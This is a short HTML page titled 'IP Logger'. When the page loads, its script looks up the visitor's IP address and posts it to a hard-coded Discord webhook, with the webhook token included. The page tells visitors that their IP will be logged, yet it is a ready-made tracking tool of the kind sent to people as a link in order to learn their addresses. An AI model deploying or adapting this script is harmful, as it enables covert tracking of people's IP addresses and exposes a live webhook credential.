<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>IP Logger</title>
  <script src="https://cdn.jsdelivr.net/npm/ipinfo"></script>
</head>
<body>
  <h1>IP Logger</h1>
  <p>Your IP address will be logged when you visit this page.</p>

  <script>
    // Get the visitor's IP address using the ipinfo library
    ipinfo().then(ipData => {
      const ipAddress = ipData.ip;
      console.log(`Visitor's IP address: ${ipAddress}`);

      // Send the IP address to a Discord webhook
      const webhookUrl = 'https://discord.com/api/webhooks/1408542403924857002/TxHDUtisp_062xNNuqHxxMiQiksUWRo9bzZkNLyLZeoaIiIw-fKpMHCIIJt9kJ7fQKKA';
      const payload = {
        content: `Visitor's IP address: ${ipAddress}`
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(() => {
        console.log('IP address sent to Discord successfully.');
      })
      .catch(error => {
        console.error('Error sending IP address to Discord:', error);
      });
    })
    .catch(error => {
      console.error('Error fetching visitor IP address:', error);
    });
  </script>
</body>
</html>
